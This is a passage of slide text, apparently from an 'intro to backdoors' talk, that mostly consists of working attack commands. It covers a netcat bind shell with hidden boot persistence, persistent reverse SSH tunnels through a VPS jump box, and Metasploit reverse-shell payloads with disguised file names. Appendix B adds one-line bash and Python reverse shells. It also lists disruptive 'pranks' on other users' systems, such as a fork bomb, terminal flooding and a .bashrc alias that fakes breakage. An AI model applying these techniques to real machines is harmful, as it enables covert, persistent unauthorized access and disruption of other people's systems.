Otherwise it will close the program after the first 
connection.
#!/bin/bash while [  1 ]; do
        echo -n | netcat  -l -v -p 445 -e /bin/bash
done
Setup GNU Netcat Backdoor on 
Linux
# wget http://yourtookitsite.com/netcat
# iptables -A INPUT -m state --state NEW -m tcp 
-p tcp --dport 445 -j ACCEPT
# cp netcat /usr/bin
# iptables -A OUTPUT -p tcp --dport 445 -m 
conntrack --ctstate NEW -j ACCEPT
# nohup ./listener.sh & 
Have Netcat Start on Boot
• Should we use /etc/rc.local ? 
– Maybe someone might see it
• Centos 
– place startup script in /etc/rc.d/init.d/
• Debian
– /etc/rc3.d/ 
Or
– /etc/rcN.d where n is the runlevel.
Connecting to the backdoor.
nc -v ipaddress port
View programs that have open ports.
# netstat -lptun
Linux Pranks
• Iptables and perl script to flip images
–
http://www.ex-parrot.com/pete/upside-down-ternet.html
• Linux Fork Bomb
– :(){ :|:& }:
• Write to users terminal
–
Write username
• Make sure volume is  high and send random noise:
– Cat /dev/urandom > /dev/dsp
http://unix.stackexchange.com/questions/232/unix-linux-pranks
Change all output to bork bork
• http://www.commandlinefu.
com/commands/view/177/translate-your-terminal-into-
swedish-chef
perl -e '$b="bork"; while(){$l=`$_ 2>&1`; $l=~s/[A-
Za-z]+/$b/g; print "$l$b\@$b:\$ ";}’
Send Starwars to other user’s terminal
Cowsay to user terminal
Cmatrix to user terminal
# fortune | cowsay > /dev/pts/0
# who
someuser  pts/0        2014-03-20 22:26 (x.x.x.2)
root pts/1                  2014-03-20 23:34 (x.x.x.2)
# telnet towel.blinkenlights.nl > /dev/pts/0
# cmatrix > /dev/pts/1
More Linux Pranks
while :do
    sleep 60
    echo "Follow the white rabbit."done | write username
# echo -e '\a'
- Command Bell
- Constantly write to a user's console
alias ls='echo "Segmentation fault"' 
export PROMPT_COMMAND="ls"    
- Add to ~username/.bashrc
makes it look like the system is broken.
If you need to disconnect from a 
process in Linux
• nohup command &
• Or
– Ctrl-Z 
– Bg 
– disown %1
# nohup command &
http://danielbeard.wordpress.com/2011/06/08/detaching-a-running-process-
from-a-bash-shell/
PHP compilers
• Bcompiler
– http://www.php.net/manual/en/book.bcompiler.php
• Phc
– http://www.phpcompiler.org/
• Ioncube
–http://www.ioncube.com/
• hhvm
– http://hhvm.com/
• More Compiler Links
– http://stackoverflow.com/questions/1408417/can-you-compile-
php-code
– http://stackoverflow.com/questions/1845197/convert-php-file-
to-binary
Netcat limitations
• Easy to detect.
• Anyone who knows about it or finds it on a 
open port can connect to it.
• Its not encrypted.
• Requires a lot of setup and additional tools to 
use effectively. 
So now what?
• So now we have a back door into a system, 
but it requires that we be on the same local 
area network or have a firewall port open to 
the box.
• It’s an extremely bad idea to leave a netcat 
backdoor open to the internet.
• Also its very likely you wont have access to the 
firewall to open up the port to the public 
internet.
Setup Persistent SSH Tunnel
• In most cases you can ssh outside to your own ssh server and 
put in a persistent ssh reverse shell on your target machine.
• Easiest solution is to register a Virtual Private Server ( VPS ) 
and have it listen for your ssh reverse shell.
• The reverse shell calls into the remote vps and opens a port 
on that machine which is tunneled over ssh back to the a port 
back on the target machine
• With this in place you can now access the target machine 
from anywhere.
http://commons.wikimedia.org/wiki/File:Reverse_ssh_tunnel.jpg
Reverse SSH Tunneling
• ssh -f -N -R 10000:localhost:22 user@external_server
• -N 
Do not execute a remote command. This is useful for just forwarding ports 
(protocol version 2 only).
• -f 
Requests ssh to go to background just before command execution. This is 
useful if ssh is going to ask for passwords or passphrases, but the user wants 
it in the background.
• -R [bind_address:]port:host:hostport
Specifies that the given port on the remote (server) host is to be forwarded 
to the given host and port on the local side. This works by allocating a socket 
to listen to port on the remote side, and whenever a connection is made to 
this port, the connection is forwarded over the secure channel, and a 
connection is made to host port hostport from the local machine.
Reverse shell Examples
• ssh -f -N -R 10000:localhost:22 
user@external_server
– Set port 10000 on remote server and map it to port 22 
on this local machine
• ssh -f -N -R 10001:10.0.2.3:455 
user@external_server
– Set port 10001 on remote server to ip address port 
445
• ssh -f -N -R 10001:10.0.2.3:455 -R 10000:localhost:
22 user@external_server
– Note you can also chain the –R command
Generate SSH Key
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
The key fingerprint is:
ad:c8:3a:3a:5c:fd:48:34:ad:f2:ac:63:29:70:0e:d0 root@test
The key's randomart image is:
+-----------------+
# ssh-keygen -t rsa
Copy the generated key to the remote 
machine.
ssh-copy-id –I /root/.ssh/id_rsa.pub"-p 2222 
user@remotemachine"
Use autossh to make reverse shell 
persistent.
• -i /root/.ssh/syspub
– Location of ssh key
• -M is for monitoring port
• -o "PubkeyAuthentication=yes”
– use public key authentication
• -o "PasswordAuthentication=no" 
– Do not ask for password
# autossh -M 10984 -N -f -o "PubkeyAuthentication=yes" -o 
"PasswordAuthentication=no" -i /root/.ssh/syspub -R 8888:
localhost:22 user@remoteserver -p 2222 &
SSH reverse tunnel on 
Windows Using plink
•
-P  SSH server port
•
-l 
SSH server login name
•
-pw SSH server password
•
-C enable compression
•
-R   Forward remote port to local address
C:\>plink -P 22 -l username -pw password -C -R 5900:127.0.0.1:5900 
http://www.chiark.greenend.org.uk/~sgtatham/putty/download.html
http://nemesis2.qx.net/pages/MyEnTunnel
MyEnTunnel
●
Like Autossh allows persistence but requires install and has a 
system tray.
Secure your ssh user to your vps or remote box
You will want to secure your ssh server to only allow 
tunnels through and not give the ssh tunnel user access 
to a system shell. 
This is important in the event that your shell is 
discovered you don’t want your target to be able to 
counter attack you and gain access to yours VPS. 
Also keep in mind you should be prepared to lose access 
to your jump point vps in the event they cancel it or 
someone complains. So make sure you do rely on it for 
anything else.
http://blog.flowl.info/2011/ssh-tunnel-group-only-and-no-
shell-please/
/usr/bin/disable_shell
Create a and add it to /usr/bin 
#!/bin/bash
trap '' 2 20 24
clear
echo -e ":P Sorry No Dice"
while [ true ] ; do
         sleep 500
done
exit 0
make the script executable 
chmod +x /usr/bin/tunnel_shell
Test your reverse shell
1. Create a User
2. Generate ssh keys for that user
3. Copy ssh for user
4. Modify /etc/password to use disable_shell
5. Setup cron,at,autossh, command to run ssh reverse shell
Secure your ssh jump box 
for reverse shell user account.
edit /etc/passwd
Change 
To 
user:x:300:300::/home/rshelluser:/bin/bash
user:x:300:300::/home/rshelluser:/bin/bash
chmod 700 ~/.ssh
Exploits vs  Payloads vs Vulnerabilities
• Vulnerabilities are places where you can take 
advantage of an operating system.
• Exploits are how you take advantage of  
vulnerabilities.
• Payloads are what you do once the exploit has 
been executed.
– In this example the vulnerability is leaving the 
computer unattended the exploit is the ability to 
execute scripts we are running to set up the backdoor. 
The payload would be our reverse shell or our netcat 
listener.
Using Metasploit
• You will need a server setup to listen for incoming 
connections that has Metasploit installed.  Kali has 
it installed by default.
• Start metasploit console
– Msfconsole
• Update metasploit console
– msfupdate
•  get updates for metasploit
• Metasploit training
– http://www.offensive-security.com/metasploit-
unleashed/Main_Page
Binary Payloads
• Lets generate a binary payload instead of 
using netcat.
• msfpayload windows/shell_reverse_tcp O 
– O command show all options
http://www.offensive-security.com/metasploit-unleashed/Binary_Payloads
Basic options:
Name       Current Setting  Required  Description
----       ---------------  --------  -----------
EXITFUNC   seh              yes       Exit technique: seh, thread, process
LHOST                             yes       The local address
LPORT      4444              yes       The local port
Description:
Connect back to attacker and spawn a command shell
Example output
• msfpayload windows/shell_reverse_tcp 
LHOST=metasploit_server_ip LPORT=listening_port_on_server_ip O 
• msfpayload –h 
– List all available payloads.
• /payload/path O 
–
List available options for payload.
• /payload/path X  > payload.exe 
– Save payload and save it as a Windows Portable Executable.
•  /payload/path R > payload.raw
– Raw Format
• /payload/path C > payload.c
– Export payload as C code.
• /payload/path J > payload.java
– Export code as java code.
Create a payload
PE32 executable (GUI) Intel 80386, for MS 
Windows
Execute binary on target system and listen for 
response from binary.
msfpayload windows/shell_reverse_tcp LHOST=10.10.10.123 LPORT=7777 x 
> /tmp/david_hasselhoff.exe
file /tmp/david_hasselhoff.exe 
Set msfconsole to listen for your 
binary.
• Start msfconsole
– msfconsole
– use exploit/multi/handler
– set payload windows/shell/reverse_tcp
– set LHOST 10.10.10.123 
– set LPORT 7777
• Run exploit
– exploit (starts listening port on metasploit 
systems) add it to your tool kit.
Executing binary
Appendix A 
Code Library
https://github.com/DC801/Introtobackdoors
Please help contribute to our intro to backdoors 
prank library!
Submit any useful commands or original pranks to 
the github repository and we will add them in and 
grow the library. 
You can find more infromation at www.
introtobackdoors.com
Appendix B 
One Line Reverse Shells
Python (run on target)
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
Bash (run on target)
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,
socket.SOCK_STREAM);s.connect(("10.0.0.1",8080));os.dup2(s.fileno(),
0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call
(["/bin/sh","-i"]);'
Setup Net Cat listener to Receive the shells
 (run on remote server)
nc -l -p 8080
Appendix C
VPS for remote files and reverse ssh
Sweden Dedicated
http://swedendedicated.com/vps/
NQHost 
http://nqhost.com/unmetered-xen-vps.html
Appendix D 
Interesting Projects
• Remote ssh Tunnel and Raspberry Pi
http://www.tunnelsup.com/raspberry-pi-phoning-
home-using-a-reverse-remote-ssh-tunnel
• Creating undetectable ssh backdoor using python
http://resources.infosecinstitute.com/creating-
undetectable-custom-ssh-backdoor-python-z/